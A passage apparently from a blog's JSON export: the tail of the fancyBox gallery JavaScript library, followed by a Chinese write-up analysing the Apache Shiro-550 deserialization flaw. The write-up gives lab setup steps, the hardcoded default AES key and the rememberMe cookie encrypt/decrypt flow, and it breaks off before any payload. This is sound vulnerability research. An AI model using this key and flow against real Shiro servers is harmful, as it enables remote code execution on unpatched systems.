Math.round($slide[0].clientWidth); self.canvasHeight = Math.round($slide[0].clientHeight); self.contentLastPos = null; self.contentStartPos = $.fancybox.getTranslate(self.$content) || { top: 0, left: 0 }; self.sliderStartPos = $.fancybox.getTranslate($slide); // Since position will be absolute, but we need to make it relative to the stage self.stagePos = $.fancybox.getTranslate(instance.$refs.stage); self.sliderStartPos.top -= self.stagePos.top; self.sliderStartPos.left -= self.stagePos.left; self.contentStartPos.top -= self.stagePos.top; self.contentStartPos.left -= self.stagePos.left; $(document) .off(\".fb.touch\") .on(isTouchDevice ? \"touchend.fb.touch touchcancel.fb.touch\" : \"mouseup.fb.touch mouseleave.fb.touch\", $.proxy(self, \"ontouchend\")) .on(isTouchDevice ? \"touchmove.fb.touch\" : \"mousemove.fb.touch\", $.proxy(self, \"ontouchmove\")); if ($.fancybox.isMobile) { document.addEventListener(\"scroll\", self.onscroll, true); } // Skip if clicked outside the sliding area if (!(self.opts || self.canPan) || !($target.is(self.$stage) || self.$stage.find($target).length)) { if ($target.is(\".fancybox-image\")) { e.preventDefault(); } if (!($.fancybox.isMobile && $target.parents(\".fancybox-caption\").length)) { return; } } self.isScrollable = isScrollable($target) || isScrollable($target.parent()); // Check if element is scrollable and try to prevent default behavior (scrolling) if (!($.fancybox.isMobile && self.isScrollable)) { e.preventDefault(); } // One finger or mouse click - swipe or pan an image if (self.startPoints.length === 1 || current.hasError) { if (self.canPan) { $.fancybox.stop(self.$content); self.isPanning = true; } else { self.isSwiping = true; } self.$container.addClass(\"fancybox-is-grabbing\"); } // Two fingers - zoom image if (self.startPoints.length === 2 && current.type === \"image\" && (current.isLoaded || current.$ghost)) { self.canTap = false; self.isSwiping = false; self.isPanning = false; self.isZooming = true; $.fancybox.stop(self.$content); self.centerPointStartX = (self.startPoints[0].x + self.startPoints[1].x) * 0.5 - $(window).scrollLeft(); self.centerPointStartY = (self.startPoints[0].y + self.startPoints[1].y) * 0.5 - $(window).scrollTop(); self.percentageOfImageAtPinchPointX = (self.centerPointStartX - self.contentStartPos.left) / self.contentStartPos.width; self.percentageOfImageAtPinchPointY = (self.centerPointStartY - self.contentStartPos.top) / self.contentStartPos.height; self.startDistanceBetweenFingers = distance(self.startPoints[0], self.startPoints[1]); } }; Guestures.prototype.onscroll = function (e) { var self = this; self.isScrolling = true; document.removeEventListener(\"scroll\", self.onscroll, true); }; Guestures.prototype.ontouchmove = function (e) { var self = this; // Make sure user has not released over iframe or disabled element if (e.originalEvent.buttons !== undefined && e.originalEvent.buttons === 0) { self.ontouchend(e); return; } if (self.isScrolling) { self.canTap = false; return; } self.newPoints = getPointerXY(e); if (!(self.opts || self.canPan) || !self.newPoints.length || !self.newPoints.length) { return; } if (!(self.isSwiping && self.isSwiping === true)) { e.preventDefault(); } self.distanceX = distance(self.newPoints[0], self.startPoints[0], \"x\"); self.distanceY = distance(self.newPoints[0], self.startPoints[0], \"y\"); self.distance = distance(self.newPoints[0], self.startPoints[0]); // Skip false ontouchmove events (Chrome) if (self.distance > 0) { if (self.isSwiping) { self.onSwipe(e); } else if (self.isPanning) { self.onPan(); } else if (self.isZooming) { self.onZoom(); } } }; Guestures.prototype.onSwipe = function (e) { var self = this, instance = self.instance, swiping = self.isSwiping, left = self.sliderStartPos.left || 0, angle; // If direction is not yet determined if (swiping === true) { // We need at least 10px distance to correctly calculate an angle if (Math.abs(self.distance) > 10) { self.canTap = false; if (instance.group.length < 2 && self.opts.vertical) { self.isSwiping = \"y\"; } else if (instance.isDragging || self.opts.vertical === false || (self.opts.vertical === \"auto\" && $(window).width() > 800)) { self.isSwiping = \"x\"; } else { angle = Math.abs((Math.atan2(self.distanceY, self.distanceX) * 180) / Math.PI); self.isSwiping = angle > 45 && angle < 135 ? \"y\" : \"x\"; } if (self.isSwiping === \"y\" && $.fancybox.isMobile && self.isScrollable) { self.isScrolling = true; return; } instance.isDragging = self.isSwiping; // Reset points to avoid jumping, because we dropped first swipes to calculate the angle self.startPoints = self.newPoints; $.each(instance.slides, function (index, slide) { var slidePos, stagePos; $.fancybox.stop(slide.$slide); slidePos = $.fancybox.getTranslate(slide.$slide); stagePos = $.fancybox.getTranslate(instance.$refs.stage); slide.$slide .css({ transform: \"\", opacity: \"\", \"transition-duration\": \"\" }) .removeClass(\"fancybox-animated\") .removeClass(function (index, className) { return (className.match(/(^|\\s)fancybox-fx-\\S+/g) || []).join(\" \"); }); if (slide.pos === instance.current.pos) { self.sliderStartPos.top = slidePos.top - stagePos.top; self.sliderStartPos.left = slidePos.left - stagePos.left; } $.fancybox.setTranslate(slide.$slide, { top: slidePos.top - stagePos.top, left: slidePos.left - stagePos.left }); }); // Stop slideshow if (instance.SlideShow && instance.SlideShow.isActive) { instance.SlideShow.stop(); } } return; } // Sticky edges if (swiping == \"x\") { if ( self.distanceX > 0 && (self.instance.group.length < 2 || (self.instance.current.index === 0 && !self.instance.current.opts.loop)) ) { left = left + Math.pow(self.distanceX, 0.8); } else if ( self.distanceX < 0 && (self.instance.group.length < 2 || (self.instance.current.index === self.instance.group.length - 1 && !self.instance.current.opts.loop)) ) { left = left - Math.pow(-self.distanceX, 0.8); } else { left = left + self.distanceX; } } self.sliderLastPos = { top: swiping == \"x\" ? 0 : self.sliderStartPos.top + self.distanceY, left: left }; if (self.requestId) { cancelAFrame(self.requestId); self.requestId = null; } self.requestId = requestAFrame(function () { if (self.sliderLastPos) { $.each(self.instance.slides, function (index, slide) { var pos = slide.pos - self.instance.currPos; $.fancybox.setTranslate(slide.$slide, { top: self.sliderLastPos.top, left: self.sliderLastPos.left + pos * self.canvasWidth + pos * slide.opts.gutter }); }); self.$container.addClass(\"fancybox-is-sliding\"); } }); }; Guestures.prototype.onPan = function () { var self = this; // Prevent accidental movement (sometimes, when tapping casually, finger can move a bit) if (distance(self.newPoints[0], self.realPoints[0]) < ($.fancybox.isMobile ? 10 : 5)) { self.startPoints = self.newPoints; return; } self.canTap = false; self.contentLastPos = self.limitMovement(); if (self.requestId) { cancelAFrame(self.requestId); } self.requestId = requestAFrame(function () { $.fancybox.setTranslate(self.$content, self.contentLastPos); }); }; // Make panning sticky to the edges Guestures.prototype.limitMovement = function () { var self = this; var canvasWidth = self.canvasWidth; var canvasHeight = self.canvasHeight; var distanceX = self.distanceX; var distanceY = self.distanceY; var contentStartPos = self.contentStartPos; var currentOffsetX = contentStartPos.left; var currentOffsetY = contentStartPos.top; var currentWidth = contentStartPos.width; var currentHeight = contentStartPos.height; var minTranslateX, minTranslateY, maxTranslateX, maxTranslateY, newOffsetX, newOffsetY; if (currentWidth > canvasWidth) { newOffsetX = currentOffsetX + distanceX; } else { newOffsetX = currentOffsetX; } newOffsetY = currentOffsetY + distanceY; // Slow down proportionally to traveled distance minTranslateX = Math.max(0, canvasWidth * 0.5 - currentWidth * 0.5); minTranslateY = Math.max(0, canvasHeight * 0.5 - currentHeight * 0.5); maxTranslateX = Math.min(canvasWidth - currentWidth, canvasWidth * 0.5 - currentWidth * 0.5); maxTranslateY = Math.min(canvasHeight - currentHeight, canvasHeight * 0.5 - currentHeight * 0.5); // -> if (distanceX > 0 && newOffsetX > minTranslateX) { newOffsetX = minTranslateX - 1 + Math.pow(-minTranslateX + currentOffsetX + distanceX, 0.8) || 0; } // minTranslateY) { newOffsetY = minTranslateY - 1 + Math.pow(-minTranslateY + currentOffsetY + distanceY, 0.8) || 0; } // /\\ if (distanceY < 0 && newOffsetY < maxTranslateY) { newOffsetY = maxTranslateY + 1 - Math.pow(maxTranslateY - currentOffsetY - distanceY, 0.8) || 0; } return { top: newOffsetY, left: newOffsetX }; }; Guestures.prototype.limitPosition = function (newOffsetX, newOffsetY, newWidth, newHeight) { var self = this; var canvasWidth = self.canvasWidth; var canvasHeight = self.canvasHeight; if (newWidth > canvasWidth) { newOffsetX = newOffsetX > 0 ? 0 : newOffsetX; newOffsetX = newOffsetX < canvasWidth - newWidth ? canvasWidth - newWidth : newOffsetX; } else { // Center horizontally newOffsetX = Math.max(0, canvasWidth / 2 - newWidth / 2); } if (newHeight > canvasHeight) { newOffsetY = newOffsetY > 0 ? 0 : newOffsetY; newOffsetY = newOffsetY < canvasHeight - newHeight ? canvasHeight - newHeight : newOffsetY; } else { // Center vertically newOffsetY = Math.max(0, canvasHeight / 2 - newHeight / 2); } return { top: newOffsetY, left: newOffsetX }; }; Guestures.prototype.onZoom = function () { var self = this; // Calculate current distance between points to get pinch ratio and new width and height var contentStartPos = self.contentStartPos; var currentWidth = contentStartPos.width; var currentHeight = contentStartPos.height; var currentOffsetX = contentStartPos.left; var currentOffsetY = contentStartPos.top; var endDistanceBetweenFingers = distance(self.newPoints[0], self.newPoints[1]); var pinchRatio = endDistanceBetweenFingers / self.startDistanceBetweenFingers; var newWidth = Math.floor(currentWidth * pinchRatio); var newHeight = Math.floor(currentHeight * pinchRatio); // This is the translation due to pinch-zooming var translateFromZoomingX = (currentWidth - newWidth) * self.percentageOfImageAtPinchPointX; var translateFromZoomingY = (currentHeight - newHeight) * self.percentageOfImageAtPinchPointY; // Point between the two touches var centerPointEndX = (self.newPoints[0].x + self.newPoints[1].x) / 2 - $(window).scrollLeft(); var centerPointEndY = (self.newPoints[0].y + self.newPoints[1].y) / 2 - $(window).scrollTop(); // And this is the translation due to translation of the centerpoint // between the two fingers var translateFromTranslatingX = centerPointEndX - self.centerPointStartX; var translateFromTranslatingY = centerPointEndY - self.centerPointStartY; // The new offset is the old/current one plus the total translation var newOffsetX = currentOffsetX + (translateFromZoomingX + translateFromTranslatingX); var newOffsetY = currentOffsetY + (translateFromZoomingY + translateFromTranslatingY); var newPos = { top: newOffsetY, left: newOffsetX, scaleX: pinchRatio, scaleY: pinchRatio }; self.canTap = false; self.newWidth = newWidth; self.newHeight = newHeight; self.contentLastPos = newPos; if (self.requestId) { cancelAFrame(self.requestId); } self.requestId = requestAFrame(function () { $.fancybox.setTranslate(self.$content, self.contentLastPos); }); }; Guestures.prototype.ontouchend = function (e) { var self = this; var swiping = self.isSwiping; var panning = self.isPanning; var zooming = self.isZooming; var scrolling = self.isScrolling; self.endPoints = getPointerXY(e); self.dMs = Math.max(new Date().getTime() - self.startTime, 1); self.$container.removeClass(\"fancybox-is-grabbing\"); $(document).off(\".fb.touch\"); document.removeEventListener(\"scroll\", self.onscroll, true); if (self.requestId) { cancelAFrame(self.requestId); self.requestId = null; } self.isSwiping = false; self.isPanning = false; self.isZooming = false; self.isScrolling = false; self.instance.isDragging = false; if (self.canTap) { return self.onTap(e); } self.speed = 100; // Speed in px/ms self.velocityX = (self.distanceX / self.dMs) * 0.5; self.velocityY = (self.distanceY / self.dMs) * 0.5; if (panning) { self.endPanning(); } else if (zooming) { self.endZooming(); } else { self.endSwiping(swiping, scrolling); } return; }; Guestures.prototype.endSwiping = function (swiping, scrolling) { var self = this, ret = false, len = self.instance.group.length, distanceX = Math.abs(self.distanceX), canAdvance = swiping == \"x\" && len > 1 && ((self.dMs > 130 && distanceX > 10) || distanceX > 50), speedX = 300; self.sliderLastPos = null; // Close if swiped vertically / navigate if horizontally if (swiping == \"y\" && !scrolling && Math.abs(self.distanceY) > 50) { // Continue vertical movement $.fancybox.animate( self.instance.current.$slide, { top: self.sliderStartPos.top + self.distanceY + self.velocityY * 150, opacity: 0 }, 200 ); ret = self.instance.close(true, 250); } else if (canAdvance && self.distanceX > 0) { ret = self.instance.previous(speedX); } else if (canAdvance && self.distanceX < 0) { ret = self.instance.next(speedX); } if (ret === false && (swiping == \"x\" || swiping == \"y\")) { self.instance.centerSlide(200); } self.$container.removeClass(\"fancybox-is-sliding\"); }; // Limit panning from edges // ======================== Guestures.prototype.endPanning = function () { var self = this, newOffsetX, newOffsetY, newPos; if (!self.contentLastPos) { return; } if (self.opts.momentum === false || self.dMs > 350) { newOffsetX = self.contentLastPos.left; newOffsetY = self.contentLastPos.top; } else { // Continue movement newOffsetX = self.contentLastPos.left + self.velocityX * 500; newOffsetY = self.contentLastPos.top + self.velocityY * 500; } newPos = self.limitPosition(newOffsetX, newOffsetY, self.contentStartPos.width, self.contentStartPos.height); newPos.width = self.contentStartPos.width; newPos.height = self.contentStartPos.height; $.fancybox.animate(self.$content, newPos, 366); }; Guestures.prototype.endZooming = function () { var self = this; var current = self.instance.current; var newOffsetX, newOffsetY, newPos, reset; var newWidth = self.newWidth; var newHeight = self.newHeight; if (!self.contentLastPos) { return; } newOffsetX = self.contentLastPos.left; newOffsetY = self.contentLastPos.top; reset = { top: newOffsetY, left: newOffsetX, width: newWidth, height: newHeight, scaleX: 1, scaleY: 1 }; // Reset scalex/scaleY values; this helps for perfomance and does not break animation $.fancybox.setTranslate(self.$content, reset); if (newWidth < self.canvasWidth && newHeight < self.canvasHeight) { self.instance.scaleToFit(150); } else if (newWidth > current.width || newHeight > current.height) { self.instance.scaleToActual(self.centerPointStartX, self.centerPointStartY, 150); } else { newPos = self.limitPosition(newOffsetX, newOffsetY, newWidth, newHeight); $.fancybox.animate(self.$content, newPos, 150); } }; Guestures.prototype.onTap = function (e) { var self = this; var $target = $(e.target); var instance = self.instance; var current = instance.current; var endPoints = (e && getPointerXY(e)) || self.startPoints; var tapX = endPoints[0] ? endPoints[0].x - $(window).scrollLeft() - self.stagePos.left : 0; var tapY = endPoints[0] ? endPoints[0].y - $(window).scrollTop() - self.stagePos.top : 0; var where; var process = function (prefix) { var action = current.opts[prefix]; if ($.isFunction(action)) { action = action.apply(instance, [current, e]); } if (!action) { return; } switch (action) { case \"close\": instance.close(self.startEvent); break; case \"toggleControls\": instance.toggleControls(); break; case \"next\": instance.next(); break; case \"nextOrClose\": if (instance.group.length > 1) { instance.next(); } else { instance.close(self.startEvent); } break; case \"zoom\": if (current.type == \"image\" && (current.isLoaded || current.$ghost)) { if (instance.canPan()) { instance.scaleToFit(); } else if (instance.isScaledDown()) { instance.scaleToActual(tapX, tapY); } else if (instance.group.length < 2) { instance.close(self.startEvent); } } break; } }; // Ignore right click if (e.originalEvent && e.originalEvent.button == 2) { return; } // Skip if clicked on the scrollbar if (!$target.is(\"img\") && tapX > $target[0].clientWidth + $target.offset().left) { return; } // Check where is clicked if ($target.is(\".fancybox-bg,.fancybox-inner,.fancybox-outer,.fancybox-container\")) { where = \"Outside\"; } else if ($target.is(\".fancybox-slide\")) { where = \"Slide\"; } else if ( instance.current.$content && instance.current.$content .find($target) .addBack() .filter($target).length ) { where = \"Content\"; } else { return; } // Check if this is a double tap if (self.tapped) { // Stop previously created single tap clearTimeout(self.tapped); self.tapped = null; // Skip if distance between taps is too big if (Math.abs(tapX - self.tapX) > 50 || Math.abs(tapY - self.tapY) > 50) { return this; } // OK, now we assume that this is a double-tap process(\"dblclick\" + where); } else { // Single tap will be processed if user has not clicked second time within 300ms // or there is no need to wait for double-tap self.tapX = tapX; self.tapY = tapY; if (current.opts[\"dblclick\" + where] && current.opts[\"dblclick\" + where] !== current.opts[\"click\" + where]) { self.tapped = setTimeout(function () { self.tapped = null; if (!instance.isAnimating) { process(\"click\" + where); } }, 500); } else { process(\"click\" + where); } } return this; }; $(document) .on(\"onActivate.fb\", function (e, instance) { if (instance && !instance.Guestures) { instance.Guestures = new Guestures(instance); } }) .on(\"beforeClose.fb\", function (e, instance) { if (instance && instance.Guestures) { instance.Guestures.destroy(); } }); })(window, document, jQuery); // ========================================================================== // // SlideShow // Enables slideshow functionality // // Example of usage: // $.fancybox.getInstance().SlideShow.start() // // ========================================================================== (function (document, $) { \"use strict\"; $.extend(true, $.fancybox.defaults, { btnTpl: { slideShow: '' + '' + '' + \"\" }, slideShow: { autoStart: false, speed: 3000, progress: true } }); var SlideShow = function (instance) { this.instance = instance; this.init(); }; $.extend(SlideShow.prototype, { timer: null, isActive: false, $button: null, init: function () { var self = this, instance = self.instance, opts = instance.group[instance.currIndex].opts.slideShow; self.$button = instance.$refs.toolbar.find(\"[data-fancybox-play]\").on(\"click\", function () { self.toggle(); }); if (instance.group.length < 2 || !opts) { self.$button.hide(); } else if (opts.progress) { self.$progress = $('').appendTo(instance.$refs.inner); } }, set: function (force) { var self = this, instance = self.instance, current = instance.current; // Check if reached last element if (current && (force === true || current.opts.loop || instance.currIndex < instance.group.length - 1)) { if (self.isActive && current.contentType !== \"video\") { if (self.$progress) { $.fancybox.animate(self.$progress.show(), { scaleX: 1 }, current.opts.slideShow.speed); } self.timer = setTimeout(function () { if (!instance.current.opts.loop && instance.current.index == instance.group.length - 1) { instance.jumpTo(0); } else { instance.next(); } }, current.opts.slideShow.speed); } } else { self.stop(); instance.idleSecondsCounter = 0; instance.showControls(); } }, clear: function () { var self = this; clearTimeout(self.timer); self.timer = null; if (self.$progress) { self.$progress.removeAttr(\"style\").hide(); } }, start: function () { var self = this, current = self.instance.current; if (current) { self.$button .attr(\"title\", (current.opts.i18n[current.opts.lang] || current.opts.i18n.en).PLAY_STOP) .removeClass(\"fancybox-button--play\") .addClass(\"fancybox-button--pause\"); self.isActive = true; if (current.isComplete) { self.set(true); } self.instance.trigger(\"onSlideShowChange\", true); } }, stop: function () { var self = this, current = self.instance.current; self.clear(); self.$button .attr(\"title\", (current.opts.i18n[current.opts.lang] || current.opts.i18n.en).PLAY_START) .removeClass(\"fancybox-button--pause\") .addClass(\"fancybox-button--play\"); self.isActive = false; self.instance.trigger(\"onSlideShowChange\", false); if (self.$progress) { self.$progress.removeAttr(\"style\").hide(); } }, toggle: function () { var self = this; if (self.isActive) { self.stop(); } else { self.start(); } } }); $(document).on({ \"onInit.fb\": function (e, instance) { if (instance && !instance.SlideShow) { instance.SlideShow = new SlideShow(instance); } }, \"beforeShow.fb\": function (e, instance, current, firstRun) { var SlideShow = instance && instance.SlideShow; if (firstRun) { if (SlideShow && current.opts.slideShow.autoStart) { SlideShow.start(); } } else if (SlideShow && SlideShow.isActive) { SlideShow.clear(); } }, \"afterShow.fb\": function (e, instance, current) { var SlideShow = instance && instance.SlideShow; if (SlideShow && SlideShow.isActive) { SlideShow.set(); } }, \"afterKeydown.fb\": function (e, instance, current, keypress, keycode) { var SlideShow = instance && instance.SlideShow; // \"P\" or Spacebar if (SlideShow && current.opts.slideShow && (keycode === 80 || keycode === 32) && !$(document.activeElement).is(\"button,a,input\")) { keypress.preventDefault(); SlideShow.toggle(); } }, \"beforeClose.fb onDeactivate.fb\": function (e, instance) { var SlideShow = instance && instance.SlideShow; if (SlideShow) { SlideShow.stop(); } } }); // Page Visibility API to pause slideshow when window is not active $(document).on(\"visibilitychange\", function () { var instance = $.fancybox.getInstance(), SlideShow = instance && instance.SlideShow; if (SlideShow && SlideShow.isActive) { if (document.hidden) { SlideShow.clear(); } else { SlideShow.set(); } } }); })(document, jQuery); // ========================================================================== // // FullScreen // Adds fullscreen functionality // // ========================================================================== (function (document, $) { \"use strict\"; // Collection of methods supported by user browser var fn = (function () { var fnMap = [ [\"requestFullscreen\", \"exitFullscreen\", \"fullscreenElement\", \"fullscreenEnabled\", \"fullscreenchange\", \"fullscreenerror\"], // new WebKit [ \"webkitRequestFullscreen\", \"webkitExitFullscreen\", \"webkitFullscreenElement\", \"webkitFullscreenEnabled\", \"webkitfullscreenchange\", \"webkitfullscreenerror\" ], // old WebKit (Safari 5.1) [ \"webkitRequestFullScreen\", \"webkitCancelFullScreen\", \"webkitCurrentFullScreenElement\", \"webkitCancelFullScreen\", \"webkitfullscreenchange\", \"webkitfullscreenerror\" ], [ \"mozRequestFullScreen\", \"mozCancelFullScreen\", \"mozFullScreenElement\", \"mozFullScreenEnabled\", \"mozfullscreenchange\", \"mozfullscreenerror\" ], [\"msRequestFullscreen\", \"msExitFullscreen\", \"msFullscreenElement\", \"msFullscreenEnabled\", \"MSFullscreenChange\", \"MSFullscreenError\"] ]; var ret = {}; for (var i = 0; i < fnMap.length; i++) { var val = fnMap[i]; if (val && val[1] in document) { for (var j = 0; j < val.length; j++) { ret[fnMap[0][j]] = val[j]; } return ret; } } return false; })(); if (fn) { var FullScreen = { request: function (elem) { elem = elem || document.documentElement; elem[fn.requestFullscreen](elem.ALLOW_KEYBOARD_INPUT); }, exit: function () { document[fn.exitFullscreen](); }, toggle: function (elem) { elem = elem || document.documentElement; if (this.isFullscreen()) { this.exit(); } else { this.request(elem); } }, isFullscreen: function () { return Boolean(document[fn.fullscreenElement]); }, enabled: function () { return Boolean(document[fn.fullscreenEnabled]); } }; $.extend(true, $.fancybox.defaults, { btnTpl: { fullScreen: '' + '' + '' + \"\" }, fullScreen: { autoStart: false } }); $(document).on(fn.fullscreenchange, function () { var isFullscreen = FullScreen.isFullscreen(), instance = $.fancybox.getInstance(); if (instance) { // If image is zooming, then force to stop and reposition properly if (instance.current && instance.current.type === \"image\" && instance.isAnimating) { instance.isAnimating = false; instance.update(true, true, 0); if (!instance.isComplete) { instance.complete(); } } instance.trigger(\"onFullscreenChange\", isFullscreen); instance.$refs.container.toggleClass(\"fancybox-is-fullscreen\", isFullscreen); instance.$refs.toolbar .find(\"[data-fancybox-fullscreen]\") .toggleClass(\"fancybox-button--fsenter\", !isFullscreen) .toggleClass(\"fancybox-button--fsexit\", isFullscreen); } }); } $(document).on({ \"onInit.fb\": function (e, instance) { var $container; if (!fn) { instance.$refs.toolbar.find(\"[data-fancybox-fullscreen]\").remove(); return; } if (instance && instance.group[instance.currIndex].opts.fullScreen) { $container = instance.$refs.container; $container.on(\"click.fb-fullscreen\", \"[data-fancybox-fullscreen]\", function (e) { e.stopPropagation(); e.preventDefault(); FullScreen.toggle(); }); if (instance.opts.fullScreen && instance.opts.fullScreen.autoStart === true) { FullScreen.request(); } // Expose API instance.FullScreen = FullScreen; } else if (instance) { instance.$refs.toolbar.find(\"[data-fancybox-fullscreen]\").hide(); } }, \"afterKeydown.fb\": function (e, instance, current, keypress, keycode) { // \"F\" if (instance && instance.FullScreen && keycode === 70) { keypress.preventDefault(); instance.FullScreen.toggle(); } }, \"beforeClose.fb\": function (e, instance) { if (instance && instance.FullScreen && instance.$refs.container.hasClass(\"fancybox-is-fullscreen\")) { FullScreen.exit(); } } }); })(document, jQuery); // ========================================================================== // // Thumbs // Displays thumbnails in a grid // // ========================================================================== (function (document, $) { \"use strict\"; var CLASS = \"fancybox-thumbs\", CLASS_ACTIVE = CLASS + \"-active\"; // Make sure there are default values $.fancybox.defaults = $.extend( true, { btnTpl: { thumbs: '' + '' + \"\" }, thumbs: { autoStart: false, // Display thumbnails on opening hideOnClose: true, // Hide thumbnail grid when closing animation starts parentEl: \".fancybox-container\", // Container is injected into this element axis: \"y\" // Vertical (y) or horizontal (x) scrolling } }, $.fancybox.defaults ); var FancyThumbs = function (instance) { this.init(instance); }; $.extend(FancyThumbs.prototype, { $button: null, $grid: null, $list: null, isVisible: false, isActive: false, init: function (instance) { var self = this, group = instance.group, enabled = 0; self.instance = instance; self.opts = group[instance.currIndex].opts.thumbs; instance.Thumbs = self; self.$button = instance.$refs.toolbar.find(\"[data-fancybox-thumbs]\"); // Enable thumbs if at least two group items have thumbnails for (var i = 0, len = group.length; i < len; i++) { if (group[i].thumb) { enabled++; } if (enabled > 1) { break; } } if (enabled > 1 && !!self.opts) { self.$button.removeAttr(\"style\").on(\"click\", function () { self.toggle(); }); self.isActive = true; } else { self.$button.hide(); } }, create: function () { var self = this, instance = self.instance, parentEl = self.opts.parentEl, list = [], src; if (!self.$grid) { // Create main element self.$grid = $('').appendTo( instance.$refs.container .find(parentEl) .addBack() .filter(parentEl) ); // Add \"click\" event that performs gallery navigation self.$grid.on(\"click\", \"a\", function () { instance.jumpTo($(this).attr(\"data-index\")); }); } // Build the list if (!self.$list) { self.$list = $('').appendTo(self.$grid); } $.each(instance.group, function (i, item) { src = item.thumb; if (!src && item.type === \"image\") { src = item.src; } list.push( ' 1 && /^\\+?\\d+$/.test(rez[rez.length - 1]) ? parseInt(rez.pop(-1), 10) || 1 : 1, gallery = rez.join(\"-\"); return { hash: hash, /* Index is starting from 1 */ index: index < 1 ? 1 : index, gallery: gallery }; } // Trigger click evnt on links to open new fancyBox instance function triggerFromUrl(url) { if (url.gallery !== \"\") { // If we can find element matching 'data-fancybox' atribute, // then triggering click event should start fancyBox $(\"[data-fancybox='\" + $.escapeSelector(url.gallery) + \"']\") .eq(url.index - 1) .focus() .trigger(\"click.fb-start\"); } } // Get gallery name from current instance function getGalleryID(instance) { var opts, ret; if (!instance) { return false; } opts = instance.current ? instance.current.opts : instance.opts; ret = opts.hash || (opts.$orig ? opts.$orig.data(\"fancybox\") || opts.$orig.data(\"fancybox-trigger\") : \"\"); return ret === \"\" ? false : ret; } // Start when DOM becomes ready $(function () { // Check if user has disabled this module if ($.fancybox.defaults.hash === false) { return; } // Update hash when opening/closing fancyBox $(document).on({ \"onInit.fb\": function (e, instance) { var url, gallery; if (instance.group[instance.currIndex].opts.hash === false) { return; } url = parseUrl(); gallery = getGalleryID(instance); // Make sure gallery start index matches index from hash if (gallery && url.gallery && gallery == url.gallery) { instance.currIndex = url.index - 1; } }, \"beforeShow.fb\": function (e, instance, current, firstRun) { var gallery; if (!current || current.opts.hash === false) { return; } // Check if need to update window hash gallery = getGalleryID(instance); if (!gallery) { return; } // Variable containing last hash value set by fancyBox // It will be used to determine if fancyBox needs to close after hash change is detected instance.currentHash = gallery + (instance.group.length > 1 ? \"-\" + (current.index + 1) : \"\"); // If current hash is the same (this instance most likely is opened by hashchange), then do nothing if (window.location.hash === \"#\" + instance.currentHash) { return; } if (firstRun && !instance.origHash) { instance.origHash = window.location.hash; } if (instance.hashTimer) { clearTimeout(instance.hashTimer); } // Update hash instance.hashTimer = setTimeout(function () { if (\"replaceState\" in window.history) { window.history[firstRun ? \"pushState\" : \"replaceState\"]({}, document.title, window.location.pathname + window.location.search + \"#\" + instance.currentHash ); if (firstRun) { instance.hasCreatedHistory = true; } } else { window.location.hash = instance.currentHash; } instance.hashTimer = null; }, 300); }, \"beforeClose.fb\": function (e, instance, current) { if (!current || current.opts.hash === false) { return; } clearTimeout(instance.hashTimer); // Goto previous history entry if (instance.currentHash && instance.hasCreatedHistory) { window.history.back(); } else if (instance.currentHash) { if (\"replaceState\" in window.history) { window.history.replaceState({}, document.title, window.location.pathname + window.location.search + (instance.origHash || \"\")); } else { window.location.hash = instance.origHash; } } instance.currentHash = null; } }); // Check if need to start/close after url has changed $(window).on(\"hashchange.fb\", function () { var url = parseUrl(), fb = null; // Find last fancyBox instance that has \"hash\" $.each( $(\".fancybox-container\") .get() .reverse(), function (index, value) { var tmp = $(value).data(\"FancyBox\"); if (tmp && tmp.currentHash) { fb = tmp; return false; } } ); if (fb) { // Now, compare hash values if (fb.currentHash !== url.gallery + \"-\" + url.index && !(url.index === 1 && fb.currentHash == url.gallery)) { fb.currentHash = null; fb.close(); } } else if (url.gallery !== \"\") { triggerFromUrl(url); } }); // Check current hash and trigger click event on matching element to start fancyBox, if needed setTimeout(function () { if (!$.fancybox.getInstance()) { triggerFromUrl(parseUrl()); } }, 50); }); })(window, document, jQuery); // ========================================================================== // // Wheel // Basic mouse weheel support for gallery navigation // // ========================================================================== (function (document, $) { \"use strict\"; var prevTime = new Date().getTime(); $(document).on({ \"onInit.fb\": function (e, instance, current) { instance.$refs.stage.on(\"mousewheel DOMMouseScroll wheel MozMousePixelScroll\", function (e) { var current = instance.current, currTime = new Date().getTime(); if (instance.group.length < 2 || current.opts.wheel === false || (current.opts.wheel === \"auto\" && current.type !== \"image\")) { return; } e.preventDefault(); e.stopPropagation(); if (current.$slide.hasClass(\"fancybox-animated\")) { return; } e = e.originalEvent || e; if (currTime - prevTime < 250) { return; } prevTime = currTime; instance[(-e.deltaY || -e.deltaX || e.wheelDelta || -e.detail) < 0 ? \"next\" : \"previous\"](); }); } }); })(document, jQuery);"}],"posts":[{"title":"Shiro反序列化漏洞分析","slug":"Shiro反序列化漏洞分析","date":"2021-09-09T11:28:28.000Z","updated":"2021-09-16T04:13:35.603Z","comments":true,"path":"Shiro反序列化漏洞分析/","link":"","permalink":"https://0range228.github.io/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"序言 浮云游子意，落日故人情。 填Shiro的坑。","text":"序言 浮云游子意，落日故人情。 填Shiro的坑。 Apache Shiro 简介Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。Shiro的优势在于轻量级，使用简单、上手更快、学习成本低。 Shiro-550特征：返回包中包含rememberMe=deleteMe字段。 影响版本：shiro&lt;1.2.24 环境搭建123git clone https://github.com/apache/shiro.gitcd shirogit checkout shiro-root-1.2.4 修改一下pom.xml: 1234567&lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt; &lt;!-- 这里需要将jstl设置为1.2 --&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt;&lt;/dependency&gt; 最后不要忘记配置artifact： 成功： 调试官方提示在CookieRememberMeManager类中 可以看出一对对称函数： 加密把断点下在org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin，debug模式启动tomcat容器，root-secret ，勾选Remember Me选项，来到： 来到这里，我们跟进entrypt方法： cipherService具体如下： getEncryptionCipherKey具体是干嘛的呢： 返回硬编码的key：kPH+bIxk5D2deZiIxcaaaA== 继续跟，直到结束前面所有的操作； 进入rememberSerializedIdentity函数： 总结： 用户名序列化 AES-CBC加密，key已知为kPH+bIxk5D2deZiIxcaaaA== Base64编码 将上述设置到cookie中的rememberme字段 解密断点打到org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity： 两个重点： 1- 跟进getRememberedPrincipals函数： base64为rememberMe字段的value，需要先进行base64解码 2- 跟进convertBytesToPrincipals函数 可以看到先AES解密，再反序列化 解密过程总结： 